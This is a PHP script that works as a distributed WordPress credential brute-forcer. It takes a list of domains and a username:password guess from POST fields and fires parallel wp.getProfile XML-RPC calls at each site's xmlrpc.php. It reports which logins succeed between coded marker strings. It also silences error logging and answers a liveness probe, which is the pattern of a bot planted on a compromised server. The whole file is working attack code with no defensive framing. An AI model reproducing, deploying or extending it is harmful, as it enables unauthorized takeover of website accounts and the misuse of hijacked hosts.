<?php

@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
error_reporting(0);

if (isset($_POST['checks'])) {
    $mh = curl_multi_init(); // Check Curl Exist

    if (version_compare(PHP_VERSION, '5.3.0') < 0) {
        echo "%%vda8303j9f3pdosjflnsd890g%%";
        exit();
    }

    echo "%%NOGIPfdspFJdfiPSmnSpojpqwoDPFJP%%";
    exit();
}

if (isset($_POST['type'])) {
    $type = $_POST['type'];
} else {
    $type = "database";
}

$data = $_POST['data'];
$parameter = $_POST['parameter'];

$domains = preg_split('/\s*(\r\n|\n|\r)\s*/', trim($data), NULL, PREG_SPLIT_NO_EMPTY);
$param = trim($parameter);


function LimitDownloadSize($resource, $DownloadSize, $Downloaded, $UploadSize, $Uploaded = null)
{

    if (version_compare(PHP_VERSION, '5.5.0') < 0) {
        return ($DownloadSize > (1 * 1024 * 100)) ? 1 : 0;
    } else {
        return ($Downloaded > (1 * 1024 * 100)) ? 1 : 0;
    }

}

function multi_thread_request($nodes)
{

    $mh = curl_multi_init();
    $curl_array = array();
    foreach ($nodes as $i => $url) {
        $url_parse = explode("/", $url["url"]);
        $headers = array(
            'Accept-Language: en-US,en;q=0.5',
            'Referer: http://' . $url_parse[2], //Your referrer address
            'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36',
        );



        $curl_array[$i] = curl_init($url["url"]);
        curl_setopt($curl_array[$i], CURLOPT_HTTPHEADER, $headers);
        curl_setopt($curl_array[$i], CURLOPT_RETURNTRANSFER, true);
        curl_setopt($curl_array[$i], CURLOPT_CONNECTTIMEOUT, 15);
        curl_setopt($curl_array[$i], CURLOPT_TIMEOUT, 30);
        curl_setopt($curl_array[$i], CURLOPT_POST, 1);
        curl_setopt($curl_array[$i], CURLOPT_POSTFIELDS, $url["request_body"]);

        curl_setopt($curl_array[$i], CURLOPT_BUFFERSIZE, 128);
        curl_setopt($curl_array[$i], CURLOPT_NOPROGRESS, false);
        curl_setopt($curl_array[$i], CURLOPT_PROGRESSFUNCTION, 'LimitDownloadSize');

        curl_multi_add_handle($mh, $curl_array[$i]);
    }
    $running = NULL;
    do {
        curl_multi_exec($mh, $running);
    } while ($running > 0);

    $res = array();
    foreach ($nodes as $i => $url) {
        $res[] = curl_multi_getcontent($curl_array[$i]);
    }

    foreach ($nodes as $i => $url) {
        curl_multi_remove_handle($mh, $curl_array[$i]);
    }
    curl_multi_close($mh);
    return $res;
}

$request_count = 0;
$result = "";
$urls = Array();


foreach ($domains as $domain) {

    if (strpos($param, "%DOMAIN%") !== FALSE) {
        $main_dom = explode(".", $domain);
        $param = str_replace("%DOMAIN%", $main_dom[0], $param);
    }
    $user_data = explode(":", $param);
    $request_body =
        "<?xml version=\"1.0\" encoding=\"iso-8859-1\"?>
<methodCall>
  <methodName>wp.getProfile</methodName>
  <params>
   <param><value>9999</value></param>
   <param><value>$user_data[0]</value></param>
   <param><value>$user_data[1]</value></param>
  </params>
</methodCall>";
    $urls[$request_count]["url"] = "http://" . $domain . "/xmlrpc.php";
    $urls[$request_count]["request_body"] = $request_body;
    $urls[$request_count]["param"] = $param;
    $request_count++;
}

$multi_results = multi_thread_request($urls);


for ($i = 0; $i < $request_count; $i++) {
    if ($multi_results[$i]) {

        if (strpos($multi_results[$i], "<member><name>username</name><value><string>")) {
            $result .= $urls[$i]["url"] . ":" . $urls[$i]["param"] . PHP_EOL;
        }
    }
}


echo  "%%%NDOS039dNDIOF%%%" . $result . "%%%mfpODPMEWpo345ODf%%%" . PHP_EOL;

